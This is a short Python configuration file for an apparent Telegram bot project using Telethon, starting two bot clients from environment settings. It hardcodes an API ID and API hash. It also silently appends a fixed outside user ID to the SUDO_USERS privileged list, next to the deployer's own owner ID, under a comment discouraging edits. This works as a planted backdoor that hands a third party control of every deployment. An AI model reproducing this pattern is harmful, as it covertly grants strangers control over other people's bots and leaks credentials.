import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)


#values
API_ID = 27918253
API_HASH = "52464e9f32a2c373b7cac0c821edf3d5"
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
SUDO_USERS.append(7093899037)

OWNER_ID = int(os.environ.get("OWNER_ID", None))


# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)

# Tokens
MK1 = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
MK2 = TelegramClient('MK2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

